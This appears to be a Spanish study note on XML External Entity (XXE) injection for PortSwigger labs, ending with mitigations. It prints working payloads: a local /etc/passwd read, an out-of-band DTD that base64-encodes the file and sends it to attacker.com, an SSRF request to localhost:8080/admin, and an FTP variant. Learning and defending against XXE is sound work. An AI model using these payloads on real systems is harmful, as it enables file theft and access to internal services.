***MATERIAL DE AYUDA EN XXE PORTSWIGGER***

![[Pasted image 20250325170914.png]]
# **XML External Entity Injection (XXE)**

## 🏗 **Estructura de un ataque XXE**

La inyección de entidades externas en XML permite **leer archivos**, **realizar SSRF** y, en algunos casos, incluso ejecutar comandos en el sistema.

📌 **Ejemplo de una carga XXE simple:**

xml



`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [   <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <root>   <data>&xxe;</data> </root>`

📌 **Salida esperada:** Si el servidor es vulnerable, puede responder con el contenido de `/etc/passwd`.

---

## 🕵️‍♂️ **XXE OOB (Out of Band) - A ciegas**

No siempre se puede ver el output directamente en la respuesta. En esos casos, se usa **OOB XXE**, donde el atacante **exfiltra información a un servidor externo**.

### 🔗 **Ejemplo con una DTD externa para exfiltrar datos**

📌 **Payload en la petición XML:**

xml



`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [   <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd">   %xxe; ]> <Profesores>   <Nombre>Kenzy</Nombre>   <Edad>26</Edad>   <Rol>LAMMER</Rol> </Profesores>`

📌 **Contenido del archivo `malicious.dtd` en el servidor atacante (`attacker.com`)**

xml



`<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?file=%file;'>"> %eval; %exfil;`

👉 **Explicación:**

1. Se usa `php://filter/convert.base64-encode/resource=/etc/passwd` para leer y codificar el archivo en base64.
    
2. Luego, el contenido exfiltrado se envía a `http://attacker.com/?file=[DATA]`.
    

---

## 🎯 **SSRF a través de XXE**

Un ataque **SSRF (Server-Side Request Forgery)** puede ejecutarse mediante XXE al hacer que el servidor vulnerable realice solicitudes a **servicios internos**.

### 🔥 **Ejemplo de XXE → SSRF**

📌 **Carga XXE para hacer una petición HTTP interna:**

xml

CopiarEditar

`<!DOCTYPE foo [   <!ENTITY xxe SYSTEM "http://localhost:8080/admin"> ]> <root>   <data>&xxe;</data> </root>`

👉 **Si el servidor tiene acceso a `localhost:8080/admin`, la respuesta puede filtrarse.**

### 📌 **Variantes con FTP y `file://`**

xml

CopiarEditar

`<!DOCTYPE foo [   <!ENTITY xxe SYSTEM "ftp://attacker.com/malware"> ]> <root>   <data>&xxe;</data> </root>`

📌 Esto puede usarse para **exfiltrar credenciales** de ciertos servicios.

---

## 🔐 **Mitigaciones**

Para protegerse de XXE, se recomienda:  
✅ **Deshabilitar entidades externas en el parser XML.**  
✅ **Usar bibliotecas seguras** como `defusedxml` en Python.  
✅ **Aplicar WAFs y monitorear tráfico HTTP saliente.**

---

### 📜 **Conclusión**

- XXE permite leer archivos, hacer SSRF y exfiltrar datos.
    
- XXE OOB (Out of Band) ayuda cuando la respuesta no se muestra directamente.
    
- El uso de **DTD externas** permite hacer ataques más avanzados.
    
- **Mitigarlo implica restringir el acceso a entidades externas en XML.**